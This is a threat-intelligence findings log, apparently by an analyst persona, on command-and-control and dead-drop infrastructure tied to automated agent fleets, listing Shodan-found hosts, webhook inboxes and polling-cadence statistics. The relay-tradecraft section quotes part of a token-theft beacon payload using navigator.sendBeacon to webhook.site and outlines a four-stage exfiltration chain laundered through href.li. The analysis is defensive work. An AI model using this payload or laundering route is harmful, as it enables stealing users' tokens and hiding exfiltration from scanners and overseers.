# FINDINGS — C2 PATTERN ANALYST

*Started 2026-10-05 ~07:10 UTC. Incremental; resume from existing sections.*
*Method: Shodan + public scan data, READ-ONLY. No live probing of candidates (opsec).*
*Grading: OURS (in our corpora) / KNOWN (publicly documented) / GENUINELY NEW.*

## Reference discriminator (metronome)
- **Cron-shaped:** phase-locked to second 0, gap CV ~0.9, fixed periods (60/180/360 s).
- **Agent-fleet-shaped (Amap):** uniform second distribution (χ² p≈0.48), same-second parallel volleys across ≥3 task tags, gap CV ~13.9 heavy-tailed.
- **Interactive agent session:** CV 0.5–1.7, zero second-boundary hits, sparse submissions over hours.

## Lane 1 — Shodan beacon-hunt
*Egress was down 07:15–~07:45 UTC; restored after. All below is Shodan READ-ONLY (no connections made).*

### 1a. webhook.site-titled hosts (13 total)
6× = webhook.site's own Hetzner infra (app03/app04) — KNOWN/legitimate. 3× Azure/AWS proxies serving webhook.site error pages (proxy-shaped, not agent infra). Standouts:

**GENUINELY NEW — self-hosted dead-drop + AI tooling on VN residential IP**
`118.69.18.194` (AS18403, HCMC xDSL residential):
- :80 "Webhook.site Clone - Live Webhook Inspector" (self-hosted dead-drop receiver)
- :8888 "AI Web Chat & Model Management" (AI/model panel, same box)
- :9090 "Đăng nhập — VN Analysis" (Vietnamese login page)
- :22 OpenSSH
Pivots: 4 services, 1 IP, residential ASN. Someone runs their own webhook dead-drop receiver co-hosted with AI chat/model management on a home connection — the exact toolkit shape of our agents (dead-drop + LLM). NOT in our corpora. Logged, not probed.

**Noted, single-pivot:** `gityzxmznuljhwtwvmo.spminstrument.com` (Cloudflare 104.26.0.130:443, scanned 2026-10-05) serves webhook.site-titled content on a random-subdomain lookalike — phishing-kit or mirror shaped. Cannot pivot further from Shodan alone; logged as lead.

### 1b. httpbun-titled hosts (7 total) — self-hosted httpbun clones
**GENUINELY NEW — letss.win cluster (3 pivots: hostname + port + title × 2 ASNs)**
- `95.169.18.20` (Cluster Logic Inc, AS25820): :8443 "Httpbun" (nginx) + :2083 **Ncat HTTP proxy**
- `207.57.145.214` (NTT America, AS1054): :8443 "Httpbun" (nginx) + :22 OpenSSH
Self-hosted httpbun on the same port/hostname across two providers, one box also running an Ncat proxy. httpbun-clone + open proxy = relay infrastructure shaped exactly like our corpora's httpbun tradecraft.

**GENUINELY NEW — Tencent Beijing httpbun + LLM gateway**
`62.234.187.97` (Tencent Cloud Beijing, AS45090):
- :8080 "Httpbun" (self-hosted httpbun clone)
- :3000 "New API" (open-source LLM API gateway/relay)
- :80 default nginx (OpenCloudOS)
Pivots: httpbun clone + LLM gateway co-hosted on Tencent Cloud Beijing. Agent-toolkit shaped; Beijing hosting is thematically adjacent to the Chinese Amap fleet. Logged, not probed.

**Not agent infra:** `167.71.138.56` (DigitalOcean) = hobbyist homelab (Nginx Proxy Manager, Uptime Kuma, "Home Lab", httpbin.org:8080).

## Lane 2 — Polling-cadence analysis (local corpora)

### 2a. webhook.site dead-drop scanning by the Amap fleet — OURS + KNOWN
Two urlquery submissions in the Amap corpus target webhook.site inboxes:
| time (UTC) | route | submitted URL | report |
|---|---|---|---|
| 2026-10-04 15:01:37 | carrier (direct) | `webhook.site/6ddc559e-5c08-4915-a5b2-f4addc42368a` | `97f0619b-36e5-4c01-adab-a18a89b2b319` |
| 2026-10-04 15:13:31 | relay (via href.li) | `webhook.site/a7753b69-2ceb-4221-adfa-80f69d57480c?run=1791126770493` | `eb4ecb55-d335-45fb-b775-6746d422c7f0` |

Both inboxes are in codebreaker's dead-drop inventory (`personas/codebreaker/`): `a7753b69` is the retrieved inbox (7 mentions), `6ddc559e` appears in `raw/deaddrop-probe-20261005T052152.jsonl`, `raw/deaddrop-reqs-20261005T052807.jsonl`, `raw/deaddrop-retrieval.md`. Reading: the Amap fleet agents were *visiting/scanning dead-drop inboxes* (12 min apart, two different inboxes, two different routes) — the fleet uses urlquery to check dead drops, or probes them as relay targets. n=2: not a cadence, but a behavior. Grade: agent-shaped, KNOWN inboxes, new observation that the fleet scans them.

### 2b. LiveCodes program-staging cadence — OURS, graded NOT-beacon
`livecodes.io/?mode=result&html=<encoded>` ×26, span 2026-09-30 → 2026-10-04. Gap stats: min 4 s, median 766 s, max 268,402 s, **CV 3.90**; zero second-0 hits; seconds spread across all 10-s bins. Per metronome discriminator: heavy-tailed, no phase-lock → interactive agent sessions staging HTML programs for scanning, NOT a cron/beacon retrieval loop. Agent-shaped, not C2-shaped.

### 2c. httpbun/base64 code-carrier bursts (oai-tag-sweep corpus) — OURS, machine-burst
n=203, span 2026-05-14 → 2026-06-21. Gap histogram: 65× <10 s, 36× <60 s, 85× <1 h, 16× >1 h — rapid-fire clusters separated by hours. 34 distinct payloads; top payload submitted **91×**: `<!doctype html><html><body…` (HTML rendering probe via httpbun's base64 endpoint). Second payload ×38 (`<html><body><form id=f method…`). Reading: retry/verification-loop shaped (same payload hammered in <10 s bursts), consistent with agent eval harnesses checking rendering, not a beacon. KNOWN tradecraft (httpbun as code carrier), new cadence detail.

## Lane 4 — cadence grading (metronome discriminator applied)
| family | n | gap CV | second-0 | verdict |
|---|---|---|---|---|
| livecodes.io staging | 26 | 3.90 | 0 | interactive agent sessions, NOT beacon |
| httpbun/base64 | 203 | bursty (<10 s clusters) | n/a (scan times) | machine retry-loop, NOT beacon |
| webhook.site pair | 2 | n/a | n/a | behavior note, not a cadence |

No cron-shaped (phase-locked, CV~0.9) retrieval loop found in the corpora. The agent fleets poll like interactive workers with retry bursts, not like beacons.

## Lane 3 — webhook-inbox census
*Deferred: needs search-engine egress (was down 07:15–07:45 UTC; restored after Lane 1 consumed the window). Local note: oai-tag-sweep (96k) and openai-agent-traces (590k) contain ZERO webhook.site/pipedream/beeceptor references; Amap corpus has 2 (both KNOWN codebreaker inboxes, §2a).*

## Summary (2026-10-05 ~08:00 UTC)
- **3 GENUINELY NEW infra observations** (all Shodan READ-ONLY, ≥2 pivots, none in our corpora): (1) VN residential box running a webhook.site clone + AI model management; (2) letss.win 2-ASN self-hosted-httpbun cluster with Ncat proxy; (3) Tencent Beijing httpbun clone + "New API" LLM gateway.
- **1 lead:** Cloudflare-fronted lookalike subdomain serving webhook.site content (single pivot).
- **Cadence verdict:** no cron-shaped beacon loop in the corpora. Agent fleets poll like interactive workers with retry bursts (LiveCodes CV 3.9, httpbun/base64 <10 s clusters), not like C2 beacons.
- **Relay tradecraft:** 21 href.li-laundered submissions; the S2 Umeng token-theft beacon test page was relayed through href.li — four-stage chain (href.li → httpbun/base64 → sendBeacon → webhook.site) with laundering at both ends.
- **Deferred:** webhook-inbox census via search engines (Lane 3); deeper Shodan pivots (cert history, favicon hashes) — both need follow-up passes.

## Lane 2d — relay-route tradecraft (referrer laundering) — OURS, C2-relevant
Route split in Amap corpus: direct 2,002 / carrier 118 / **relay 21**. Relay = `href.li/?https://<target>` — a referrer-stripping redirector hiding the true target from scanner logs. Relay targets (n=21):
- httpbun base64 probes ×6 (incl. codebreaker S2 Umeng token-theft beacon `umx={wu:x=>T=x};__fycb=x=>T=x` + `navigator.sendBeacon('https://webhook.…` — report `e32e37d2-456c-4240-954b-f7e2cbb27315`)
- Amap POI task URLs ×8 (POI `B019B0XY35` relayed 6× across front-ends)
- webhook.site dead drop ×1 (`a7753b69`, codebreaker's retrieved inbox)
- `fanyi.baidu.com/transpage` ×1 (Baidu Translate proxy as relay hop)

Reading: the fleet launders its most sensitive fetches — beacon test pages, dead drops, and repeat task targets — through href.li so the scanner-side logs show only the redirector. The S2 beacon payload is KNOWN (codebreaker retrieved the inbox and 5 stolen bx-ua tokens); the **href.li relay hop on beacon-test submissions is the new routing detail**. Multi-hop pattern: `href.li → httpbun/base64 → (executing page) → sendBeacon → webhook.site`. That is a four-stage exfil chain with laundering at both ends.
